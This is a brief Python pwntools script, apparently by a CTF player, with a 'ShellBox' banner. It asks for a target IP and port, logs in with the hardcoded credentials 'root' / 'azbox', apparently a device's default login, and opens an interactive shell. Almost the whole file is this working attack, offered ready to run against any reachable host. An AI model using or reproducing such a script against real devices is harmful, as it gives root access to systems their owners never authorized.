#!/usr/bin/python
#
# Thiago Sena (THX)
# github: https://github.com/thxsena
# ctf team: Fireshell
#

from pwn import *

print ('''
	
 ____  _          _ _ ____            
/ ___|| |__   ___| | | __ )  _____  __
\___ \| '_ \ / _ \ | |  _ \ / _ \ \/ /  
 ___) | | | |  __/ | | |_) | (_) >  <   
|____/|_| |_|\___|_|_|____/ \___/_/\_\   
		
		by Thiago a.k.a THX


''')



HOST = raw_input("Ip: ")
PORT = raw_input('Port: ')


r = remote(HOST, int(PORT))

r.sendline('root')
r.recvline()
r.sendline('azbox')
r.recvline()

r = r.interactive()
